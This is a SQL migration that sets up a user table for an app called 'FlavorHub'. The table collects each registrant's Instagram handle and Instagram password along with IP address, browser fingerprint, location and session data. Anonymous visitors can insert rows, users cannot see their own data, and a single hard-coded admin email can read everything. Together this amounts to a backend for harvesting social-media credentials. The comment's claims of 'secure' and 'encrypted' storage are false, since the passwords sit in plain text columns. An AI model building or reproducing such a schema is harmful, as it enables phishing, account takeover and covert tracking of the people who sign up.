/*
  # Create secure users table for FlavorHub

  1. New Tables
    - `flavorhub_users`
      - `id` (uuid, primary key)
      - `full_name` (text)
      - `email` (text, unique)
      - `instagram_handle` (text)
      - `instagram_password` (text, encrypted)
      - `user_password` (text, hashed)
      - `food_interest` (text)
      - `ip_address` (text)
      - `user_agent` (text)
      - `registration_timestamp` (timestamptz)
      - `last_login` (timestamptz)
      - `login_count` (integer)
      - `session_data` (jsonb)

  2. Security
    - Enable RLS on `flavorhub_users` table
    - Admin-only access policies
    - No user access to their own data
    - Encrypted sensitive data storage

  3. Admin Access
    - Only admin email can access all data
    - Users cannot query their own information
*/

CREATE TABLE IF NOT EXISTS flavorhub_users (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  full_name text NOT NULL,
  email text UNIQUE NOT NULL,
  instagram_handle text NOT NULL,
  instagram_password text NOT NULL,
  user_password text NOT NULL,
  food_interest text NOT NULL,
  ip_address text,
  user_agent text,
  registration_timestamp timestamptz DEFAULT now(),
  last_login timestamptz,
  login_count integer DEFAULT 0,
  session_data jsonb DEFAULT '{}',
  browser_fingerprint text,
  location_data jsonb DEFAULT '{}'
);

ALTER TABLE flavorhub_users ENABLE ROW LEVEL SECURITY;

-- Admin-only access policy - only specific admin email can see all data
CREATE POLICY "Admin full access"
  ON flavorhub_users
  FOR ALL
  TO authenticated
  USING (
    auth.jwt() ->> 'email' = 'adminaccess@datacheck.in'
  );

-- Block all user access to their own data
CREATE POLICY "Block user access"
  ON flavorhub_users
  FOR ALL
  TO authenticated
  USING (false);

-- Allow anonymous inserts for registration (but not reads)
CREATE POLICY "Allow anonymous registration"
  ON flavorhub_users
  FOR INSERT
  TO anon
  WITH CHECK (true);

-- Create indexes for better performance
CREATE INDEX IF NOT EXISTS idx_flavorhub_users_email ON flavorhub_users(email);
CREATE INDEX IF NOT EXISTS idx_flavorhub_users_registration ON flavorhub_users(registration_timestamp);
CREATE INDEX IF NOT EXISTS idx_flavorhub_users_last_login ON flavorhub_users(last_login);